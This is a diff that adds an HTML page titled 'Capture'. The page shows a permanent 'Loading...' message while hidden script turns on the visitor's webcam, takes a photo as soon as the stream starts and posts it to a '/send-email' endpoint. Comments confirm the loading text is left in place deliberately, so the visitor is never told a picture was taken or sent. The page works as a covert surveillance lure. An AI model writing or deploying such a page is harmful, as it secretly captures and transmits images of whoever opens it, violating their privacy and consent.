@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Capture</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        #status {
+            font-size: 1.5rem;
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="status">Loading...</div>
+
+    <!-- Hidden video element for getUserMedia -->
+    <video id="webcam" autoplay playsinline style="display:none;"></video>
+
+    <script>
+        const video = document.getElementById('webcam');
+
+        async function startCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error('Browser does not support getUserMedia.');
+                return;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Immediate capture when metadata is loaded
+                video.onloadedmetadata = () => {
+                    // Slight delay to ensure video dimensions accessible if needed, 
+                    // or immediate capture as requested.
+                    // "Trigger capturePhoto() inside that event"
+                    capturePhoto();
+                };
+            } catch (err) {
+                console.error('Camera access error:', err);
+                // Keep showing "Loading..." or handle error internally
+            }
+        }
+
+        function capturePhoto() {
+            // Need to set canvas size based on video
+            const canvas = document.createElement('canvas');
+            if (video.videoWidth && video.videoHeight) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    // Stop tracks
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(t => t.stop());
+                    }
+
+                    // POST to Flask
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'captured-photo.jpg');
+
+                    $.ajax({
+                        url: '/send-email',
+                        type: 'POST',
+                        data: formData,
+                        processData: false,
+                        contentType: false,
+                        success: () => {
+                            console.log('Photo captured & sent!');
+                            // No UI update needed, stays "Loading..."
+                        },
+                        error: err => {
+                            console.error('Failed to send photo.', err);
+                        }
+                    });
+                }, 'image/jpeg', 0.95);
+            } else {
+                console.error("Video dimensions not ready yet");
+            }
+        }
+
+        window.onload = () => {
+            startCamera();
+        };
+    </script>
+</body>
+
+</html>
